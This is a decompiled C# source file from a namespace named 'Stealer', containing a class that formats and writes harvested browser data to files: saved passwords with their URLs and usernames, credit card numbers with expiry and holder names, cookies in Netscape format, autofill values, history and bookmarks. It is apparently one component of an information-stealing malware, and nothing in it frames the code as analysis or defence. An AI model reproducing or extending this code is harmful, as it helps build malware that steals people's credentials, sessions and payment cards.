using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer
{
	// Token: 0x02000011 RID: 17
	internal sealed class cBrowserUtils
	{
		// Token: 0x06000059 RID: 89 RVA: 0x000040C7 File Offset: 0x000022C7
		private static string FormatPassword(Password pPassword)
		{
			return string.Format("Url: {0}\nUsername: {1}\nPassword: {2}\n\n", pPassword.sUrl, pPassword.sUsername, pPassword.sPassword);
		}

		// Token: 0x0600005A RID: 90 RVA: 0x000040E8 File Offset: 0x000022E8
		private static string FormatCreditCard(CreditCard cCard)
		{
			return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", new object[]
			{
				Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00004144 File Offset: 0x00002344
		private static string FormatCookie(Cookie cCookie)
		{
			return string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue
			});
		}

		// Token: 0x0600005C RID: 92 RVA: 0x00004193 File Offset: 0x00002393
		private static string FormatAutoFill(AutoFill aFill)
		{
			return string.Format("{0}\t\n{1}\t\n\n", aFill.sName, aFill.sValue);
		}

		// Token: 0x0600005D RID: 93 RVA: 0x000041AB File Offset: 0x000023AB
		private static string FormatHistory(Site sSite)
		{
			return string.Format("### {0} ### ({1}) {2}\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000041D1 File Offset: 0x000023D1
		private static string FormatBookmark(Bookmark bBookmark)
		{
			if (!string.IsNullOrEmpty(bBookmark.sUrl))
			{
				return string.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			return string.Format("### {0} ###\n", bBookmark.sTitle);
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000420C File Offset: 0x0000240C
		public static bool WriteCookies(List<Cookie> cCookies, string sFile)
		{
			bool result;
			try
			{
				foreach (Cookie cCookie in cCookies)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCookie(cCookie));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00004278 File Offset: 0x00002478
		public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
		{
			bool result;
			try
			{
				foreach (AutoFill aFill in aFills)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatAutoFill(aFill));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x000042E4 File Offset: 0x000024E4
		public static bool WriteHistory(List<Site> sHistory, string sFile)
		{
			bool result;
			try
			{
				foreach (Site sSite in sHistory)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatHistory(sSite));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00004350 File Offset: 0x00002550
		public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
		{
			bool result;
			try
			{
				foreach (Bookmark bBookmark in bBookmarks)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatBookmark(bBookmark));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000063 RID: 99 RVA: 0x000043BC File Offset: 0x000025BC
		public static bool WritePasswords(List<Password> pPasswords, string sFile)
		{
			bool result;
			try
			{
				foreach (Password pPassword in pPasswords)
				{
					if (!(pPassword.sUsername == "") && !(pPassword.sPassword == ""))
					{
						File.AppendAllText(sFile, cBrowserUtils.FormatPassword(pPassword));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000064 RID: 100 RVA: 0x0000444C File Offset: 0x0000264C
		public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
		{
			bool result;
			try
			{
				foreach (CreditCard cCard in cCC)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCreditCard(cCard));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
